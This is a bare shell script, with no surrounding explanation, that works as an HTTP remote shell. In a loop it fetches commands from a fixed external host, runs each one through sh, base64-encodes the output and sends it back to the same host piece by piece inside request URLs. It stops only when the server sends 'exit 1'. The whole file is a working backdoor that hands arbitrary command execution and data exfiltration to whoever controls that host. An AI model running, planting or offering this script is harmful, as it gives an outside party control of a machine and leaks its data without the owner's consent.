set -eu
H=https://hsh.infose.cz

i=0
while :; do
        cmd=$(curl -s "${H}/$$-$i")
        if [ X'exit 1' = X"${cmd}" ]; then
                break
        fi
        echo "${cmd}" | sh | base64 | while read line; do
                curl -s "${H}/r-$$-$i-$line"
                i=$(( $i + 1 ))
        done
        i=$(( $i + 1 ))
done
